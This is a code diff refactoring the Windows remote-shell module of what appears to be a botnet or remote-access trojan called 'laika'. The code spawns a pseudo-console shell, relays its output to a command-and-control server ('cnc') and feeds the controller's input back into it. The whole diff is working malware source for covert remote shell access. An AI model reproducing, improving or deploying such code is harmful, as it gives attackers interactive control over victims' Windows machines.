@@ -8,12 +8,12 @@
 #include <process.h>
 
 /* shells are significantly more complex on windows than linux for laika */
-struct sLaika_shell {
+struct sLaika_RAWshell {
+    struct sLaika_shell _shell;
     HANDLE in, out;
     PROCESS_INFORMATION procInfo;
     STARTUPINFOEX startupInfo;
     HPCON pseudoCon;
-    uint32_t id;
 };
 
 HRESULT CreatePseudoConsoleAndPipes(HPCON *phPC, HANDLE *phPipeIn, HANDLE *phPipeOut, int cols, int rows);
@@ -21,11 +21,11 @@ HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo
 
 struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id) {;
     TCHAR szComspec[MAX_PATH];
-    struct sLaika_shell* shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
+    struct sLaika_RAWshell* shell = (struct sLaika_RAWshell*)laikaM_malloc(sizeof(struct sLaika_RAWshell));
     HRESULT hr;
 
-    ZeroMemory(shell, sizeof(struct sLaika_shell));
-    shell->id = id;
+    ZeroMemory(shell, sizeof(struct sLaika_RAWshell));
+    shell->_shell.id = id;
 
     /* create pty */
     hr = CreatePseudoConsoleAndPipes(&shell->pseudoCon, &shell->in, &shell->out, cols, rows);
@@ -73,10 +73,12 @@ struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int ro
         return NULL;
     }
 
-    return shell;
+    return (struct sLaika_shell*)shell;
 }
 
-void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
+void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *_shell) {
+    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell*)_shell;
+
     /* kill process (it's ok if it fails) */
     TerminateProcess(shell->procInfo.hProcess, 0);
 
@@ -93,10 +95,6 @@ void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
 
     /* free shell struct */
     laikaM_free(shell);
-}
-
-uint32_t laikaB_getShellID(struct sLaika_bot *bot, struct sLaika_shell *shell) {
-    return shell->id;
 }
 
 /* ============================================[[ Shell Handlers ]]============================================= */
@@ -163,33 +161,35 @@ HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo
     return hr;
 }
 
-bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
+bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *_shell) {
     char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t)];
     struct sLaika_peer* peer = bot->peer;
     struct sLaika_socket* sock = &peer->sock;
+    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell*)_shell;
     DWORD rd;
     bool readSucc = ReadFile(shell->in, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t), &rd, NULL);
 
     if (readSucc) {
         /* we read some input! send to cnc */
         laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-        laikaS_writeInt(sock, &shell->id, sizeof(uint32_t));
+        laikaS_writeInt(sock, &shell->_shell.id, sizeof(uint32_t));
         laikaS_write(sock, readBuf, rd);
         laikaS_endVarPacket(peer);
     } else {
         if (GetLastError() == ERROR_NO_DATA && WaitForSingleObject(shell->procInfo.hProcess, 0) == WAIT_TIMEOUT)
             return true; /* recoverable, process is still alive */
         /* unrecoverable error */
-        laikaB_freeShell(bot, shell);
+        laikaB_freeShell(bot, _shell);
         return false;
     }
 
     return true;
 }
 
-bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char *buf, size_t length) {
+bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *_shell, char *buf, size_t length) {
     struct sLaika_peer* peer = bot->peer;
     struct sLaika_socket* sock = &peer->sock;
+    struct sLaika_RAWshell *shell = (struct sLaika_RAWshell*)_shell;
     size_t nLeft;
     DWORD nWritten;
 
@@ -197,7 +197,7 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
     while (nLeft > 0) {
         if (!WriteFile(shell->out, (void*)buf, length, &nWritten, NULL)) {
             /* unrecoverable error */
-            laikaB_freeShell(bot, shell);
+            laikaB_freeShell(bot, _shell);
             return false;
         }
 
